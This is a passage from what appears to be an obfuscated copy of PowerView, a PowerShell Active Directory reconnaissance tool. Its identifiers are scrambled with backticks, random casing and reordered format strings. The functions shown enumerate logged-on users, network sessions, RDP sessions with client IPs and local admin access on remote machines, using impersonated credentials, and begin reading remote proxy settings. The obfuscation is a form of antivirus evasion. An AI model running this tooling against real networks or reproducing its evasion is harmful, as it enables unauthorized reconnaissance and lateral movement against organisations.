                &("{2}{1}{0}" -f 'e','-Verbos','Write') "[Get-NetShare] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
    }

    END {
        if (${lO`GontO`k`EN}) {
            &("{3}{1}{0}{4}{2}"-f'-Revert','oke','f','Inv','ToSel') -TokenHandle ${lOg`oNtoK`eN}
        }
    }
}


function GET-NETLoG`gE`DoN {


    [OutputType({"{8}{2}{7}{4}{5}{0}{6}{1}{3}" -f 's','I','rVi','nfo','w.L','oggedOnU','er','e','Powe'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOsiTioN = 0, VaLUEfrOmPiPELIne = ${TR`Ue}, vaLuefROmpipelinebyPROpERtynAME = ${Tr`Ue})]
        [Alias({"{1}{0}" -f 'ostName','H'}, {"{3}{2}{1}{0}"-f'name','shost','n','d'}, {"{1}{0}" -f'ame','n'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${C`ompUte`R`Name} = ("{0}{2}{1}" -f'l','lhost','oca'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRed`enT`iAl} =   $21Gv7E::"EM`Pty"
    )

    BEGIN {
        if (${PS`B`oUND`PArAmEtErs}[("{1}{2}{0}" -f 'l','C','redentia')]) {
            ${l`OGON`T`oKEn} = &("{0}{3}{5}{1}{2}{4}"-f'In','rI','mpe','vo','rsonation','ke-Use') -Credential ${C`Red`eNT`iAL}
        }
    }

    PROCESS {
        ForEach (${Com`p`U`Ter} in ${C`omP`U`T`eRNaMe}) {
            
            ${Qu`erY`LevEL} = 1
            ${ptR`InfO} =   ( ItEM  ('V'+'ARiAbL'+'E:Nfv')  ).Value::"Z`ERo"
            ${eNtR`iESrE`Ad} = 0
            ${T`Ot`AlrEAD} = 0
            ${rE`su`M`ehaNdlE} = 0

            
            ${r`EsuLT} = ${netA`PI32}::"Netwk`sTA`USE`R`eN`Um"(${C`Ompu`TeR}, ${quE`Ry`l`eVEl}, [ref]${PT`RiN`FO}, -1, [ref]${eNtR`IE`sREAd}, [ref]${TOta`L`Read}, [ref]${ResumE`Ha`Nd`lE})

            
            ${O`FfS`Et} = ${pT`R`InFo}.("{0}{1}"-f'ToIn','t64').Invoke()

            
            if ((${RES`ULt} -eq 0) -and (${oFf`s`eT} -gt 0)) {

                
                ${inC`R`emeNt} = ${W`KSTa`_USEr`_INFO_1}::("{1}{2}{0}" -f 'Size','Ge','t').Invoke()

                
                for (${i} = 0; (${I} -lt ${E`Nt`RiESReAD}); ${i}++) {
                    
                    ${NE`Wint`ptR} = &("{3}{0}{2}{1}" -f'w-Obj','t','ec','Ne') ("{1}{2}{0}" -f'tr','System.I','ntp') -ArgumentList ${O`Ffs`et}
                    ${in`Fo} = ${N`ewin`TptR} -as ${WKsTA_`U`S`er_i`NFO_1}

                    
                    ${L`o`GgEDON} = ${I`NfO} | &("{0}{2}{1}"-f 'S','ject','elect-Ob') ('*')
                    ${loGG`E`D`On} | &("{1}{2}{0}" -f 'er','Add-','Memb') ("{2}{1}{0}{3}" -f'e','oteprop','N','rty') ("{1}{2}{0}" -f'uterName','Co','mp') ${com`Pu`T`ER}
                    ${l`ogged`ON}."Ps`OBJ`ECT"."TypE`N`AmES".("{2}{0}{1}" -f's','ert','In').Invoke(0, ("{3}{2}{4}{1}{0}"-f'fo','In','ew.LoggedOnUse','PowerVi','r'))
                    ${Of`FseT} = ${NEw`i`NTp`TR}.("{2}{0}{1}" -f 'o','Int64','T').Invoke()
                    ${OfF`SET} += ${in`creM`eNT}
                    ${L`ogGE`DOn}
                }

                
                ${N`Ull} = ${N`ETa`Pi32}::("{3}{0}{1}{2}"-f 'Ap','iBuffe','rFree','Net').Invoke(${P`T`RinfO})
            }
            else {
                &("{2}{0}{1}"-f'erb','ose','Write-V') "[Get-NetLoggedon] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
    }

    END {
        if (${lOGon`TO`ken}) {
            &("{1}{4}{3}{0}{2}" -f'Sel','I','f','tTo','nvoke-Rever') -TokenHandle ${LOGo`N`T`oKen}
        }
    }
}


function g`eT-NEtsE`SSi`On {


    [OutputType({"{3}{4}{2}{6}{1}{0}{5}"-f 'f','ionIn','.','P','owerView','o','Sess'})]
    [CmdletBinding()]
    Param(
        [Parameter(POSiTIoN = 0, VAlUEfRompIpELInE = ${t`RUe}, valUeFromPIPelInEBypROpErtyNaME = ${Tr`Ue})]
        [Alias({"{0}{2}{1}" -f 'Hos','me','tNa'}, {"{1}{2}{3}{0}"-f 'e','dn','sho','stnam'}, {"{0}{1}" -f'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${COMp`U`TEr`NAME} = ("{2}{0}{1}"-f 'o','st','localh'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`ed`eNTIAL} =   (VaRiABlE  21Gv7e  -vAlue )::"eMP`Ty"
    )

    BEGIN {
        if (${PSB`o`UnD`p`ARaMeTerS}[("{2}{1}{0}"-f 'al','enti','Cred')]) {
            ${L`OgONtok`EN} = &("{3}{2}{4}{6}{5}{0}{7}{1}"-f 'at','on','voke','In','-UserI','on','mpers','i') -Credential ${CrE`d`eNtiAl}
        }
    }

    PROCESS {
        ForEach (${C`o`MPUTer} in ${Co`mpu`T`ERnAMe}) {
            
            ${QUerYL`e`VEL} = 10
            ${p`TRIn`FO} =   $NfV::"Z`eRo"
            ${e`NTrIeS`READ} = 0
            ${to`Talr`Ead} = 0
            ${r`e`SumEha`NdlE} = 0

            
            ${re`sU`lT} = ${neta`P`I32}::("{2}{0}{3}{1}" -f 'Sess','m','Net','ionEnu').Invoke(${Co`Mp`UTER}, '', ${U`sERnA`ME}, ${QUE`R`Y`levEL}, [ref]${ptRin`Fo}, -1, [ref]${E`NTRI`ESrE`AD}, [ref]${T`OTalr`Ead}, [ref]${RESUME`h`And`LE})

            
            ${O`Ff`SEt} = ${pT`RI`NFO}.("{2}{0}{1}"-f '6','4','ToInt').Invoke()

            
            if ((${RE`sU`lt} -eq 0) -and (${Of`FseT} -gt 0)) {

                
                ${in`crE`me`Nt} = ${sESSion`_inf`O`_`10}::("{1}{2}{0}" -f'e','GetSi','z').Invoke()

                
                for (${I} = 0; (${i} -lt ${Ent`RieSR`eAd}); ${I}++) {
                    
                    ${nE`WiN`TPtr} = &("{1}{0}{2}{3}"-f 'e','N','w','-Object') ("{0}{2}{1}" -f 'System.','ptr','Int') -ArgumentList ${oF`Fset}
                    ${IN`Fo} = ${Newi`NT`P`Tr} -as ${S`eSSIon`_iNfo`_`10}

                    
                    ${sesS`IOn} = ${i`NFo} | &("{2}{1}{0}"-f 'ect-Object','el','S') ('*')
                    ${SEs`S`Ion} | &("{2}{1}{0}"-f'mber','d-Me','Ad') ("{3}{2}{1}{0}"-f'ty','roper','otep','N') ("{0}{1}{2}{3}"-f'Co','mp','uterNa','me') ${C`omPUt`Er}
                    ${SEs`si`ON}."PS`oBJ`ecT"."t`yPEnA`MES".("{2}{0}{1}" -f'r','t','Inse').Invoke(0, ("{5}{2}{0}{1}{6}{3}{4}"-f 'e','w.S','owerVi','si','onInfo','P','es'))
                    ${off`S`eT} = ${n`EW`intptR}.("{1}{0}"-f'nt64','ToI').Invoke()
                    ${Of`F`SET} += ${In`CRe`mE`Nt}
                    ${sE`SSiOn}
                }

                
                ${NU`ll} = ${nE`TAPi32}::("{3}{2}{4}{1}{0}" -f'ree','F','A','Net','piBuffer').Invoke(${Pt`Ri`Nfo})
            }
            else {
                &("{0}{1}{3}{2}" -f 'Wr','ite-V','rbose','e') "[Get-NetSession] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
    }


    END {
        if (${LOg`o`NtOKEn}) {
            &("{2}{0}{3}{1}" -f 'voke-Revert','oSelf','In','T') -TokenHandle ${L`OGO`NToKeN}
        }
    }
}


function g`E`T-REgLOgg`EDoN {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{3}{1}" -f'PSShouldP','s','roce','s'}, '')]
    [OutputType({"{3}{1}{2}{4}{0}" -f 'nUser','werView.R','e','Po','gLoggedO'})]
    [CmdletBinding()]
    Param(
        [Parameter(poSitiOn = 0, vAlUeFrOmpipeline = ${t`RuE}, VALUEFrOMpIPElinebypROPeRtyNAMe = ${tR`Ue})]
        [Alias({"{1}{0}{2}"-f'm','HostNa','e'}, {"{0}{3}{1}{2}"-f 'd','ostnam','e','nsh'}, {"{1}{0}" -f'me','na'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${compU`TE`RNa`Me} = ("{1}{2}{0}"-f 't','lo','calhos')
    )

    BEGIN {
        if (${PS`B`oU`NDPAr`AMeTErS}[("{2}{0}{1}"-f 'enti','al','Cred')]) {
            ${Log`oN`TOKen} = &("{1}{3}{2}{4}{0}"-f'n','Invo','UserImperso','ke-','natio') -Credential ${cRe`DeNtI`AL}
        }
    }

    PROCESS {
        ForEach (${com`Pu`TEr} in ${c`Omp`UtER`NAmE}) {
            try {
                
                ${R`Eg} =  (  cHiLDItem  VARIABLE:X5W41q  ).Value::("{4}{3}{2}{0}{1}" -f'eB','aseKey','Remot','n','Ope').Invoke(("{0}{1}" -f'Us','ers'), "$ComputerName")

                
                ${R`Eg}.("{0}{2}{3}{1}" -f 'Get','s','S','ubKeyName').Invoke() | &("{0}{2}{1}"-f 'Wh','bject','ere-O') { ${_} -match ((('S-1'+'-5-21-[0-9]'+'+-['+'0-9]+-[0-9]'+'+-['+'0-'+'9]'+'+Ngs') -ReplaCE([ChAr]78+[ChAr]103+[ChAr]115),[ChAr]36)) } | &("{0}{3}{1}{2}" -f 'F','ach','-Object','orE') {
                    ${user`Na`me} = &("{1}{3}{0}{2}"-f'm-S','C','ID','onvertFro') -ObjectSID ${_} -OutputType ("{2}{0}{1}{3}" -f'i','nSim','Doma','ple')

                    if (${u`SERn`AMe}) {
                        ${U`SErN`AmE}, ${Us`ERd`OMA`In} = ${U`se`RNAMe}.("{1}{0}" -f 't','Spli').Invoke('@')
                    }
                    else {
                        ${u`ser`NAmE} = ${_}
                        ${uS`e`RDOmAiN} = ${Nu`ll}
                    }

                    ${r`e`GLo`g`GeDoNUSER} = &("{2}{1}{0}"-f 'ct','bje','New-O') ("{2}{1}{0}" -f'ct','je','PSOb')
                    ${Re`Glog`g`EDonUSEr} | &("{1}{0}{2}" -f'd-','Ad','Member') ("{0}{1}{2}" -f 'Notep','rope','rty') ("{0}{3}{2}{1}" -f'C','e','Nam','omputer') "$ComputerName"
                    ${R`E`GloGGEDO`Nuser} | &("{2}{1}{0}" -f'r','e','Add-Memb') ("{2}{0}{1}" -f'e','rty','Noteprop') ("{1}{2}{0}" -f'n','Us','erDomai') ${USeRDo`M`A`in}
                    ${r`eglOg`gEdO`N`User} | &("{2}{1}{0}" -f 'er','b','Add-Mem') ("{3}{0}{2}{1}" -f 'tep','perty','ro','No') ("{1}{2}{0}"-f 'me','Us','erNa') ${uSERN`A`Me}
                    ${REGl`oG`gedo`NUsER} | &("{1}{0}{2}"-f'dd-Me','A','mber') ("{2}{1}{0}{3}" -f'propert','ote','N','y') ("{1}{2}{0}"-f'D','Us','erSI') ${_}
                    ${REgl`o`GG`EdOnUsER}."Psob`Je`Ct"."typ`E`NAM`ES".("{1}{0}"-f't','Inser').Invoke(0, ("{4}{3}{0}{5}{1}{2}" -f 'Re','ged','OnUser','rView.','Powe','gLog'))
                    ${Re`gloGgE`DOn`USer}
                }
            }
            catch {
                &("{1}{0}{3}{2}"-f 't','Wri','bose','e-Ver') ('['+'Get-RegLogg'+'edO'+'n] '+'E'+'rror'+' '+'op'+'eni'+'ng '+'r'+'e'+'mote '+'reg'+'istry '+'o'+'n '+"'$ComputerName' "+': '+"$_")
            }
        }
    }

    END {
        if (${LoGoN`TOk`en}) {
            &("{0}{2}{3}{4}{1}"-f 'I','tToSelf','n','voke-R','ever') -TokenHandle ${LoGonTO`k`en}
        }
    }
}


function gEt-`NET`Rdp`SESSion {


    [OutputType({"{1}{3}{5}{2}{4}{0}{6}{7}"-f 'P','P','R','ower','D','View.','SessionI','nfo'})]
    [CmdletBinding()]
    Param(
        [Parameter(positIoN = 0, VALUeFROMpipelIne = ${t`RuE}, VALueFrOMPIpElinEbyproPeRtyNaMe = ${t`RuE})]
        [Alias({"{0}{1}" -f'H','ostName'}, {"{1}{2}{0}"-f 'ame','dns','hostn'}, {"{1}{0}" -f'me','na'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${COm`PuTER`Na`mE} = ("{2}{1}{0}" -f'calhost','o','l'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`ReDENtI`AL} =  $21GV7E::"eM`pTy"
    )

    BEGIN {
        if (${PSBou`N`dPARameT`ERS}[("{2}{1}{0}"-f 'al','i','Credent')]) {
            ${LOGONt`oK`EN} = &("{1}{2}{5}{0}{3}{4}"-f'mperso','Invo','ke-','nat','ion','UserI') -Credential ${Cr`e`dEN`TIAL}
        }
    }

    PROCESS {
        ForEach (${cOm`pu`Ter} in ${c`ompu`TErNAMe}) {

            
            ${h`A`NdlE} = ${wTsap`i`32}::("{1}{2}{3}{0}" -f'verEx','WT','SOp','enSer').Invoke(${c`OmpUTER})

            
            if (${HA`N`dlE} -ne 0) {

                
                ${ppsEs`SIonI`NfO} =  (  GEt-VariaBle  ('Nf'+'v')).VaLue::"Z`ERo"
                ${P`C`OUnt} = 0

                
                ${RESu`lt} = ${wt`S`Ap`I32}::"WtsE`NuMER`A`TESEs`sion`S`EX"(${H`A`NDlE}, [ref]1, 0, [ref]${PpSEssiOn`I`NFO}, [ref]${PcO`U`Nt});${l`A`stERror} =   (  Gi  variAbLe:nrQ).vaLUE::("{0}{3}{2}{1}{4}" -f'GetLast','o','r','Win32Er','r').Invoke()

                
                ${OFf`SET} = ${PpSE`sS`I`oNI`NFO}.("{0}{1}"-f 'T','oInt64').Invoke()

                if ((${ResU`LT} -ne 0) -and (${OfFS`Et} -gt 0)) {

                    
                    ${iNC`REM`EnT} = ${wT`S_SesS`I`O`N`_`INFO_1}::("{0}{1}{2}" -f 'Get','S','ize').Invoke()

                    
                    for (${i} = 0; (${i} -lt ${Pcou`NT}); ${i}++) {

                        
                        ${nEWINT`P`Tr} = &("{1}{0}{2}"-f'w','Ne','-Object') ("{0}{4}{3}{1}{2}"-f 'S','t','ptr','In','ystem.') -ArgumentList ${oFf`sEt}
                        ${iN`Fo} = ${neW`intp`Tr} -as ${wT`S_SeSSIOn_`inF`O_1}

                        ${rDPs`E`ssIoN} = &("{2}{0}{1}" -f'O','bject','New-') ("{0}{1}"-f'PS','Object')

                        if (${IN`Fo}."PhOSt`Na`ME") {
                            ${Rd`PS`ESSi`On} | &("{0}{2}{1}"-f'Add-Me','r','mbe') ("{2}{1}{0}"-f'perty','ro','Notep') ("{1}{2}{3}{0}" -f'erName','C','om','put') ${in`Fo}."pHOStn`A`me"
                        }
                        else {
                            
                            ${RdPs`ess`ioN} | &("{0}{1}{3}{2}"-f'A','dd-M','mber','e') ("{2}{0}{1}"-f'otepr','operty','N') ("{2}{0}{3}{1}"-f't','Name','Compu','er') ${cO`mpU`TEr}
                        }

                        ${rdPse`SS`ion} | &("{2}{0}{1}"-f'e','r','Add-Memb') ("{0}{2}{3}{1}"-f'N','property','o','te') ("{2}{1}{0}{3}" -f 'ionN','s','Ses','ame') ${i`NFo}."P`seSsioN`N`Ame"

                        if ($(-not ${in`Fo}."P`dO`maInNAME") -or (${i`NFo}."pDO`maiN`NA`Me" -eq '')) {
                            
                            ${rD`pse`ssIOn} | &("{1}{0}{2}{3}" -f'Me','Add-','mb','er') ("{0}{1}{2}{3}" -f'Note','pr','ope','rty') ("{1}{0}{2}" -f'Nam','User','e') "$($Info.pUserName)"
                        }
                        else {
                            ${rDP`SES`Si`On} | &("{1}{0}{2}"-f 'd-Memb','Ad','er') ("{1}{0}{3}{2}"-f't','No','ty','eproper') ("{1}{0}"-f 'serName','U') "$($Info.pDomainName)\$($Info.pUserName)"
                        }

                        ${r`DPSe`Ss`IOn} | &("{1}{2}{0}"-f'er','Add-M','emb') ("{1}{0}{3}{2}"-f'otep','N','perty','ro') 'ID' ${I`NfO}."Se`ssIO`NiD"
                        ${R`D`PsESs`IOn} | &("{0}{1}{2}" -f'A','dd-Mem','ber') ("{0}{3}{1}{2}"-f'No','eprope','rty','t') ("{1}{0}" -f'e','Stat') ${IN`FO}."St`ATE"

                        ${p`pBuf`F`Er} =  (  Gi ('VAri'+'AbL'+'e:'+'nFv')).VAlUe::"Z`eRo"
                        ${PB`Y`TeSR`EtURN`Ed} = 0

                        
                        
                        ${Re`Sult2} = ${W`TSaP`i32}::"wt`S`QUE`RYSes`SIOninFoRMA`Ti`on"(${h`AN`dlE}, ${I`Nfo}."SESs`ionID", 14, [ref]${PPBu`F`Fer}, [ref]${p`By`TeSre`T`Urned});${lA`SteR`ROr2} =   ( GCi vARIabLE:Nrq).VAlue::("{3}{0}{2}{1}"-f 'tWi','or','n32Err','GetLas').Invoke()

                        if (${rE`sul`T2} -eq 0) {
                            &("{1}{0}{2}"-f'te-Verb','Wri','ose') "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError2).Message) "
                        }
                        else {
                            ${oFf`s`Et2} = ${pP`BU`FfER}.("{0}{1}{2}" -f 'T','oInt6','4').Invoke()
                            ${newIn`T`P`TR2} = &("{0}{2}{1}" -f 'Ne','t','w-Objec') ("{0}{1}{2}{3}" -f'System.I','n','t','ptr') -ArgumentList ${Of`Fse`T2}
                            ${iN`F`O2} = ${N`Ewint`Pt`R2} -as ${W`TS_clieN`T_A`DDR`E`Ss}

                            ${So`U`RCeIp} = ${I`Nf`o2}."ADd`ReSS"
                            if (${sOU`R`cEip}[2] -ne 0) {
                                ${s`oURcEip} = [String]${so`UrCE`IP}[2]+'.'+[String]${S`oU`RCE`iP}[3]+'.'+[String]${s`O`URCEiP}[4]+'.'+[String]${so`Urc`eiP}[5]
                            }
                            else {
                                ${s`OUrC`eip} = ${N`ULL}
                            }

                            ${RD`P`SesS`IOn} | &("{0}{1}{2}{3}" -f 'A','dd-Me','m','ber') ("{1}{0}{2}" -f 'teprope','No','rty') ("{1}{0}"-f'urceIP','So') ${sO`UR`Ceip}
                            ${rdp`sEsSi`On}."p`s`oBJEcT"."tyP`e`NaMes".("{0}{1}{2}"-f 'In','ser','t').Invoke(0, ("{2}{4}{3}{1}{0}" -f 'nfo','I','Power','PSession','View.RD'))
                            ${RD`psEsSI`ON}

                            
                            ${n`Ull} = ${WT`Sa`pI32}::("{3}{2}{1}{0}" -f 'ry','o','FreeMem','WTS').Invoke(${pPbu`Ff`ER})

                            ${off`S`Et} += ${i`NCr`EM`eNT}
                        }
                    }
                    
                    ${N`ULL} = ${w`TS`ApI32}::("{0}{2}{1}{3}"-f 'W','reeMemory','TSF','Ex').Invoke(2, ${P`p`ses`siONinfo}, ${PCO`U`Nt})
                }
                else {
                    &("{3}{2}{0}{1}"-f'te-','Verbose','i','Wr') "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                }
                
                ${N`UlL} = ${WTSa`Pi32}::("{3}{1}{0}{2}"-f'r','e','ver','WTSCloseS').Invoke(${Han`DlE})
            }
            else {
                &("{3}{1}{2}{0}{4}"-f'o','rite','-Verb','W','se') ('[Get'+'-Ne'+'t'+'RDP'+'Sessio'+'n] '+'Er'+'ror '+'ope'+'ning'+' '+'t'+'he '+'Rem'+'o'+'te '+'Des'+'k'+'top '+'S'+'ess'+'ion '+'Host'+' '+'(R'+'D '+'Se'+'ssion '+'Ho'+'st'+') '+'serv'+'er'+' '+'fo'+'r: '+"$ComputerName")
            }
        }
    }

    END {
        if (${lOgON`To`KEN}) {
            &("{3}{5}{2}{6}{4}{1}{0}"-f'f','el','ert','Invok','S','e-Rev','To') -TokenHandle ${loGONt`O`Ken}
        }
    }
}


function TE`S`T`-aDMiNaCce`ss {


    [OutputType({"{3}{2}{0}{5}{1}{4}"-f'erView','Ac','ow','P','cess','.Admin'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSition = 0, VALuEfRompIpElInE = ${t`RuE}, VAlUefrompiPeLINEByPropErtyNamE = ${T`RuE})]
        [Alias({"{1}{0}" -f'tName','Hos'}, {"{0}{2}{1}" -f'd','name','nshost'}, {"{0}{1}"-f 'n','ame'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${CoMpu`Ter`N`AmE} = ("{1}{2}{0}" -f'host','lo','cal'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRe`D`En`Tial} =   ( GEt-chILDITem  varIaBle:21GV7E ).VALuE::"Em`pTy"
    )

    BEGIN {
        if (${PS`BouNdPar`AME`TerS}[("{1}{0}{2}"-f'ia','Credent','l')]) {
            ${L`OGon`TO`KEn} = &("{1}{3}{5}{0}{4}{6}{2}" -f 'rImpe','Invoke','ion','-','r','Use','sonat') -Credential ${CR`edEnt`IAL}
        }
    }

    PROCESS {
        ForEach (${c`OMpu`T`Er} in ${C`om`PUTeRNaME}) {
            
            
            ${HaN`DLe} = ${a`D`Vapi32}::("{1}{2}{0}"-f 'CManagerW','Ope','nS').Invoke("\\$Computer", ("{2}{0}{1}"-f 'cesActi','ve','Servi'), 0xF003F);${laST`Er`Ror} =  (  VArIABlE ("n"+"Rq")  ).ValUe::("{0}{4}{1}{2}{5}{3}"-f 'GetLastW','n3','2E','or','i','rr').Invoke()

            ${IsAd`M`In} = &("{1}{0}{2}" -f 'w-Ob','Ne','ject') ("{0}{2}{1}"-f 'P','ject','SOb')
            ${i`SaD`MIn} | &("{0}{2}{1}"-f 'A','-Member','dd') ("{2}{3}{0}{1}" -f 'prope','rty','No','te') ("{2}{0}{1}" -f 'rNa','me','Compute') ${C`omP`UTER}

            
            if (${HAnd`LE} -ne 0) {
                ${NU`lL} = ${AD`VA`pi32}::("{1}{3}{0}{2}"-f'Servi','Clo','ceHandle','se').Invoke(${H`An`DLE})
                ${i`s`Admin} | &("{0}{2}{3}{1}"-f'Add-M','er','e','mb') ("{1}{2}{0}" -f 'perty','No','tepro') ("{0}{1}{2}" -f'I','sA','dmin') ${tr`UE}
            }
            else {
                &("{0}{2}{1}{3}"-f 'W','rb','rite-Ve','ose') "[Test-AdminAccess] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                ${isaDM`in} | &("{2}{1}{3}{0}" -f'ember','dd-','A','M') ("{1}{2}{3}{0}"-f 'y','Not','eprope','rt') ("{2}{0}{1}"-f 'Admi','n','Is') ${FAL`sE}
            }
            ${Isa`dM`iN}."pSObj`E`ct"."TY`P`enAMeS".("{0}{1}"-f'In','sert').Invoke(0, ("{0}{6}{1}{4}{5}{3}{2}"-f 'Power','iew.A','s','Acces','d','min','V'))
            ${is`AdmIN}
        }
    }

    END {
        if (${l`o`gON`ToKen}) {
            &("{2}{4}{3}{0}{1}" -f'tT','oSelf','Invo','er','ke-Rev') -TokenHandle ${L`oG`o`NToKeN}
        }
    }
}


function ge`T-`N`etcOMpUtersIt`E`N`AmE {


    [OutputType({"{0}{1}{4}{2}{5}{3}" -f 'Po','wer','iew.Com','rSite','V','pute'})]
    [CmdletBinding()]
    Param(
        [Parameter(PosITiON = 0, VAlUeFRomPipeliNe = ${Tr`UE}, VAlUEFrOmPipelINEByproPeRtyNAME = ${TR`Ue})]
        [Alias({"{1}{0}"-f'tName','Hos'}, {"{2}{1}{0}" -f'me','hostna','dns'}, {"{0}{1}" -f'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${COMPu`Ter`NA`mE} = ("{0}{1}" -f 'l','ocalhost'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`eD`entI`Al} =   ( geT-VarIable 21gv7E -ValuE)::"EM`Pty"
    )

    BEGIN {
        if (${p`sBOu`NDParAM`E`Te`RS}[("{3}{1}{0}{2}" -f'ede','r','ntial','C')]) {
            ${L`og`o`NtokEN} = &("{1}{5}{4}{2}{3}{0}" -f 'rsonation','In','m','pe','-UserI','voke') -Credential ${crE`DEnTI`AL}
        }
    }

    PROCESS {
        ForEach (${CoM`pUter} in ${c`OM`P`UtERnA`ME}) {
            
            if (${C`ompUT`eR} -match '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$') {
                ${I`paddr`e`sS} = ${c`OMP`UteR}
                ${CoM`puT`Er} =   (gCI  VaRIaBLE:7ap4q ).vALUe::("{1}{3}{2}{0}{4}" -f 'ddre','Get','yA','HostB','ss').Invoke(${c`Omp`UtEr}) | &("{1}{0}{2}"-f'ec','Sel','t-Object') -ExpandProperty ("{2}{1}{0}"-f'e','am','HostN')
            }
            else {
                ${Ip`A`dDRE`Ss} = @(&("{2}{1}{3}{0}{4}" -f 'e','ve-','Resol','IPAddr','ss') -ComputerName ${cO`MpuTER})[0]."IPAD`d`REss"
            }

            ${PT`RI`NFO} =   (vARiaBle  nFv  ).vaLue::"Z`erO"

            ${RES`U`LT} = ${NEt`Ap`i32}::"dsGeTSi`TE`NAme"(${comp`Ut`eR}, [ref]${P`Tr`inFO})

            ${Co`M`p`Utersi`Te} = &("{2}{1}{0}" -f'ct','je','New-Ob') ("{1}{0}{2}"-f'j','PSOb','ect')
            ${cO`MpuTER`S`ITE} | &("{2}{1}{0}" -f 'mber','dd-Me','A') ("{0}{2}{1}{3}" -f'Not','p','epro','erty') ("{0}{1}{2}" -f'C','omput','erName') ${c`O`MPUTER}
            ${comP`U`T`E`RSITe} | &("{0}{2}{1}" -f 'Add','er','-Memb') ("{0}{1}{2}{3}" -f 'Note','pro','per','ty') ("{2}{1}{0}" -f'dress','Ad','IP') ${IP`AddR`esS}

            if (${r`EsUlT} -eq 0) {
                ${si`Te`NAMe} =  (  iTEM  ("vAr"+"i"+"ablE:7D"+"k")).VALuE::("{3}{2}{1}{4}{0}" -f'o','oStrin','trT','P','gAut').Invoke(${ptR`INfO})
                ${co`Mpu`TERS`Ite} | &("{1}{2}{0}" -f 'er','A','dd-Memb') ("{2}{1}{0}" -f'y','ropert','Notep') ("{1}{0}{2}"-f'am','SiteN','e') ${sITe`NA`mE}
            }
            else {
                &("{0}{2}{1}{3}"-f'Wri','Ve','te-','rbose') "[Get-NetComputerSiteName] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
                ${CoMpUTe`R`sITE} | &("{0}{1}{2}" -f'A','dd-','Member') ("{2}{3}{0}{1}" -f't','y','Notepr','oper') ("{0}{1}" -f 'Si','teName') ''
            }
            ${Co`Mp`Ut`e`RsItE}."psOb`JECt"."tyPEna`mEs".("{1}{0}"-f't','Inser').Invoke(0, ("{3}{0}{5}{2}{4}{1}" -f 'werView','ite','u','Po','terS','.Comp'))

            
            ${n`Ull} = ${N`ETA`p`I32}::("{3}{2}{0}{1}" -f'Buf','ferFree','etApi','N').Invoke(${PT`RiNfo})

            ${c`o`mPUTeRs`ite}
        }
    }

    END {
        if (${lOgON`ToK`eN}) {
            &("{2}{4}{3}{1}{5}{0}" -f 'ToSelf','e','Inv','ke-R','o','vert') -TokenHandle ${Log`O`N`ToKen}
        }
    }
}


function geT`-WmIReG`PRo`XY {


    [OutputType({"{3}{4}{2}{7}{1}{0}{5}{6}" -f 'ett','roxyS','w.','Pow','erVie','in','gs','P'})]
    [CmdletBinding()]
    Param(
        [Parameter(posiTion = 0, valUEfroMPipeliNE = ${Tr`Ue}, vAluEFroMPIPeLiNeByprOpeRtYNAMe = ${Tr`UE})]
        [Alias({"{0}{2}{1}"-f'H','ame','ostN'}, {"{1}{2}{0}" -f 'name','dns','host'}, {"{0}{1}"-f 'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${c`oMpUTEr`NAME} = ${e`NV:`CoM`puTE`RNAMe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRe`Dent`Ial} =  ( ITEm  variaBLE:21GV7e ).VAluE::"EM`pTy"
    )

    PROCESS {
        ForEach (${C`oMP`UTer} in ${com`P`UtERNAME}) {
            try {
                ${W`mIArG`UMeNtS} = @{
                    ("{0}{1}"-f 'Li','st') = ${t`RUe}
                    ("{1}{0}"-f 'ss','Cla') = ("{1}{0}{2}"-f'R','Std','egProv')
                    ("{2}{1}{0}"-f 'e','amespac','N') = ((("{2}{0}{3}{1}" -f 't{0}defa','lt','roo','u'))-F  [chaR]92)
                    ("{1}{3}{0}{2}"-f 'am','Compu','e','tern') = ${Comp`UT`ER}
                    ("{2}{3}{1}{0}"-f'n','tio','E','rrorAc') = ("{1}{0}"-f 'top','S')
                }
                if (${PS`BoUndpa`RA`meTE`RS}[("{1}{2}{0}" -f 'al','Cre','denti')]) { ${W`mI`A`RgumEnts}[("{1}{0}{2}"-f 'tia','Creden','l')] = ${cReDe`N`Tial} }

                ${R`egPROviD`ER} = &("{3}{0}{2}{4}{1}" -f'Wmi','ject','O','Get-','b') @WmiArguments
                ${k`EY} = ((("{12}{5}{7}{11}{4}{3}{13}{6}{15}{14}{18}{2}{1}{9}{10}{17}{0}{8}{19}{16}" -f 'et ','on{','i','o','r','RE','ft{0}','{0}Mi','Se','0','}','c','SOFTWA','so','indow','W','s','Intern','s{0}CurrentVers','tting'))-f [ChAr]92)

                
                ${hK`cU} = 2147483649
                ${p`Roxys`ERVer} = ${R`egP`RoviDER}.("{1}{2}{0}{3}"-f'al','GetS','tringV','ue').Invoke(${HK`CU}, ${K`eY}, ("{0}{3}{1}{2}" -f'P','x','yServer','ro'))."Sval`Ue"
